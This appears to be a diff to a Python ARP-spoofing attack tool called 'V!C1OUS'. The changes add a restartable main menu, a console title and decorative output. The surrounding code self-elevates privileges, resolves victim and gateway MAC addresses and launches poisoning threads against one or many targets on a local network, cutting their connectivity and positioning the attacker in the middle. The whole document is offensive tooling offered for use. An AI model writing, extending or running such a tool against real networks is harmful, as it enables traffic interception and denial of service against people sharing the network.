@@ -36,7 +36,17 @@ def elevate():
 # Check and elevate immediately
 elevate()
 
-print('''
+# Set console window title to V!C1OUS
+kernel32 = ctypes.windll.kernel32
+kernel32.SetConsoleTitleA(b"V!C1OUS")
+
+def clear_screen():
+    """Clear the console screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def show_banner():
+    """Display the tool banner."""
+    print('''
 ╔═══════════════════════════════════════════════════════════════════════╗
 ║                                                                       ║
 ║ ▄▄    ▄▄     ▄▄        ▄▄▄▄     ▄▄▄       ▄▄▄▄    ▄▄    ▄▄    ▄▄▄▄    ║
@@ -48,7 +58,7 @@ print('''
 ║   ▀▀▀▀       ▀▀        ▀▀▀▀   ▀▀▀▀▀▀▀▀    ▀▀▀▀      ▀▀▀▀     ▀▀▀▀▀    ║
 ║                                                                       ║
 ║                      ━ ARP Spoof Attack Tool ━             	        ║
-║                       ━  Ctrl + C to exit   ━                     	║
+║                       ━  Ctrl + C to exit   ━                         ║
 ║                                                      		            ║
 ╚═══════════════════════════════════════════════════════════════════════╝
 ''')
@@ -123,7 +133,9 @@ def signal_handler(sig, frame):
     running = False
     restore_arp()
     print("[+] ARP Spoof Stopped - Networks restored")
-    sys.exit(0)
+    time.sleep(1.5)
+    # Return to start menu with a clean screen
+    main_menu()
 
 # Global vars for restoration
 targets = []  # List of dicts: {target_ip, target_mac, gateway_ip, gateway_mac}
@@ -193,34 +205,41 @@ def run_multi_attack(targets_list, gateway_ip, our_mac):
     """Run ARP spoof against multiple targets sharing the same gateway."""
     global targets
 
-    print("\n[*] Resolving gateway MAC address...")
+    print("\n============================================")
+    print("[*] Resolving gateway MAC address...")
     gateway_mac = get_mac(gateway_ip)
     if not gateway_mac:
         print(f"[!] Could not resolve MAC for gateway {gateway_ip}")
         return False
     print(f" [+] Gateway MAC: {gateway_mac}")
     print(f" [+] Our MAC: {our_mac}")
+    print("============================================\n")
 
     resolved_targets = []
     for t_ip in targets_list:
         t_ip = t_ip.strip()
         if not t_ip:
             continue
-        print(f"\n[*] Resolving MAC for target {t_ip}...")
+        print("============================================")
+        print(f"[*] Resolving MAC for target {t_ip}...")
         t_mac = get_mac(t_ip)
         if not t_mac:
             print(f"[!] Could not resolve MAC for target {t_ip}, skipping...")
+            print("============================================")
             continue
         print(f" [+] {t_ip} -> {t_mac}")
+        print("============================================")
         resolved_targets.append({'ip': t_ip, 'mac': t_mac})
 
     if not resolved_targets:
         print("[!] No targets could be resolved. Exiting.")
         return False
 
-    print(f"\n[*] Starting multi-target ARP spoofing against {len(resolved_targets)} target(s)...")
+    print("============================================")
+    print(f"[*] Starting multi-target ARP spoofing against {len(resolved_targets)} target(s)...")
     print("[*] All targets will lose network connectivity shortly")
-    print("[*] Press Ctrl+C to stop and restore\n")
+    print("[*] Press Ctrl+C to stop and restore")
+    print("============================================\n")
 
     # Store for restoration
     for t in resolved_targets:
@@ -233,7 +252,11 @@ def run_multi_attack(targets_list, gateway_ip, our_mac):
 
     # Start spoof threads for each target
     threads = []
-    for t in resolved_targets:
+    for i, t in enumerate(resolved_targets):
+        print("============================================")
+        print(f"[*] Launching attack threads for target {i+1}: {t['ip']}")
+        print("============================================")
+
         # Spoof target into thinking we're the gateway
         t1 = threading.Thread(target=spoof_worker, args=(t['ip'], gateway_ip, t['mac'], 0.02), daemon=True)
         # Spoof gateway into thinking we're the target
@@ -263,7 +286,21 @@ def run_multi_attack(targets_list, gateway_ip, our_mac):
 
     return True
 
-if __name__ == "__main__":
+def main_menu():
+    """Show the main menu and handle attack selection."""
+    global running, targets
+
+    # Reset global state for a fresh run
+    running = True
+    targets = []
+
+    # Clear screen and show fresh banner
+    clear_screen()
+    show_banner()
+
+    # Re-register the signal handler
+    signal.signal(signal.SIGINT, signal_handler)
+
     # Get our MAC address
     our_mac = None
     for iface in scapy.get_if_list():
@@ -293,15 +330,14 @@ if __name__ == "__main__":
             print("\n[!] Exiting...")
             sys.exit(0)
 
-    signal.signal(signal.SIGINT, signal_handler)
-
     if mode == '1':
         # Single target mode
         target_ip = input(" [?] Enter your target IP: ").strip()
         gateway_ip = input(" [?] Enter your gateway's IP: ").strip()
 
         if not run_single_attack(target_ip, gateway_ip, our_mac):
-            sys.exit(1)
+            main_menu()
+            return
 
     else:
         # Multi-target mode
@@ -330,7 +366,8 @@ if __name__ == "__main__":
             sys.exit(0)
 
         if not run_multi_attack(targets_list, gateway_ip, our_mac):
-            sys.exit(1)
+            main_menu()
+            return
 
     try:
         while True:
@@ -340,3 +377,6 @@ if __name__ == "__main__":
             sys.stdout.flush()
     except KeyboardInterrupt:
         signal_handler(None, None)
+
+if __name__ == "__main__":
+    main_menu()
